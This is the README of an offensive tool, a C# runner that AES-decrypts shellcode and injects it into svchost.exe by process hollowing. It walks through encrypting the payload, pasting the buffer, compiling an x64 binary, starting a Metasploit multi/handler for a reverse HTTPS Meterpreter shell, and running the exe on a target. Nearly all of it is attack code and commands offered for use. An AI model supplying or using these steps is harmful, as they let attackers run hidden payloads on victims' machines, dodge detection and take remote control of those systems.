# AES Process Hollowing Runner

## Files

| File | Purpose |
|---|---|
| `aes-process-hollowing-runner.cs` | C# runner — AES decrypt, hollows svchost.exe via suspended process + PEB walk |

## Usage

**1. Encrypt your shellcode** using `../aes-shellcode-encryption/` and copy the output `buf`.

**2. Paste the encrypted buf into `aes-process-hollowing-runner.cs`:**
```csharp
byte[] buf = new byte[528] { 0x69, 0x8a, 0xfb, ... };  // ← replace with your full encrypted buf
```

**3. (Optional) Change the sacrifice process** — default is `svchost.exe`. Pass it as a command-line argument at runtime or change the default:
```csharp
var executable = "C:\\Windows\\System32\\svchost.exe";  // ← change if needed
```

**4. Compile:**

**Visual Studio:**
1. Create a new project → Console App (.NET Framework)
2. Replace `Program.cs` with the contents of `aes-process-hollowing-runner.cs`
3. Set configuration to **Release** and platform to **x64**
4. Build → Build Solution (`Ctrl+Shift+B`)
5. Exe is in `bin\x64\Release\`

**Command line:**
```powershell
csc /target:exe /platform:x64 /optimize+ /out:Runner.exe aes-process-hollowing-runner.cs
```

**5. Start your listener:**
```bash
msfconsole -q -x "
    use multi/handler;
    set payload windows/x64/meterpreter/reverse_https;
    set LHOST <IP>;
    set LPORT 443;
    run"
```

**6. Run the exe on the target:**
```powershell
# Default (svchost.exe)
.\Runner.exe

# Custom sacrifice process
.\Runner.exe "C:\Windows\System32\notepad.exe"
```
